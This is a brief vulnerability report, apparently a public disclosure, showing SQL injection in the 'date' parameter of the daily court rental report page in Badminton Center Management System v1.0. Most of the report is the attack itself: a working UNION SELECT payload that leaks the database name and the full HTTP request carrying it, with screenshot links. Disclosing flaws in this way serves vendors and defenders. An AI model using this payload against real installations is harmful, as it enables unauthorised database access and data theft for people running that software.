# Badminton Center Management System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Vulnerability File: /bcms/admin/?page=reports/daily_court_rental_report&date=

Vulnerability location: /bcms/admin/?page=reports/daily_court_rental_report&date=, date

[+] Payload: /bcms/admin/?page=reports/daily_court_rental_report&date=2022-05-27%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13--+ // Leak place ---> date


```sql
GET /bcms/admin/?page=reports/daily_court_rental_report&date=2022-05-27%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170613827-86412f57-891d-49d2-a502-1338656d6c9f.png)

![image](https://user-images.githubusercontent.com/54017627/170613718-b6f13276-df47-4c2c-9339-9593ea516ded.png)
